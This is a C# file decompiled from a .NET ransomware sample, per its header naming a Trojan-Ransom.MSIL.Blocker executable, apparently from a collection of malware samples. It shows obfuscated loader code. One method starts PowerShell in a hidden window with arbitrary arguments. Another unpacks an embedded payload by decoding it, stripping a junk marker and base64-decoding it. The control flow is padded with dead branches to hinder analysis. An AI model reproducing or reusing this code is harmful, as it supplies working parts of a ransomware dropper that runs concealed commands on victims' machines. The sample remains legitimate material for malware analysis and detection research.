// Decompiled with JetBrains decompiler
// Type: Tsjxretch.Factories.StateAdapterFactory
// Assembly: ac, Version=4.10.14393.1198, Culture=neutral, PublicKeyToken=null
// MVID: 71765B6E-1D0D-4AF2-DE12-4A451FD77066
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.09-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-0b19c7363002adca6627b79915e7feb2886b9f55c8af305336ef3992171b0978.exe

using ac.Mocks;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace Tsjxretch.Factories
{
  internal static class StateAdapterFactory
  {
    private static StateAdapterFactory TestDic;

    public static Process GetMerchant(string spec)
    {
      ProcessStartInfo processStartInfo = new ProcessStartInfo();
      StateAdapterFactory.CompareDic((object) processStartInfo, (object) "powershell");
      string str = spec;
      if (true)
        ;
      StateAdapterFactory.ViewDic((object) processStartInfo, (object) str);
      processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
      return (Process) StateAdapterFactory.ReadDic((object) processStartInfo);
    }

    public static byte[] CalcMerchant()
    {
      int num1 = 1;
label_1:
      int num2 = num1;
      object obj;
      while (true)
      {
        switch (num2)
        {
          case 1:
            obj = StateAdapterFactory.VerifyDic();
            if (false)
            {
              if (\u003CModule\u003E\u007B97c19ca2\u002Dd30d\u002D4926\u002Db319\u002D0f9297a6a699\u007D.m_fd98f8a8404d4a558fb4946045dde868 == 0)
              {
                num2 = 0;
                continue;
              }
              goto label_1;
            }
            else
              goto label_6;
          default:
            goto label_5;
        }
      }
label_5:
      byte[] numArray;
      return (byte[]) StateAdapterFactory.AwakeDic((object) ((string) StateAdapterFactory.RegisterDic((object) Encoding.UTF8, (object) numArray)).Replace("好不6", (string) null));
label_6:
      numArray = (byte[]) obj;
      goto label_5;
    }

    internal static void CompareDic([In] object obj0, [In] object obj1) => ((ProcessStartInfo) obj0).FileName = (string) obj1;

    internal static void ViewDic([In] object obj0, [In] object obj1) => ((ProcessStartInfo) obj0).Arguments = (string) obj1;

    internal static object ReadDic([In] object obj0) => (object) Process.Start((ProcessStartInfo) obj0);

    internal static bool PublishDic() => StateAdapterFactory.TestDic == null;

    internal static StateAdapterFactory CalculateDic() => StateAdapterFactory.TestDic;

    internal static object VerifyDic() => (object) Merchant.FindMerchant();

    internal static object RegisterDic([In] object obj0, [In] object obj1) => (object) ((Encoding) obj0).GetString((byte[]) obj1);

    internal static object AwakeDic([In] object obj0) => (object) Convert.FromBase64String((string) obj0);
  }
}
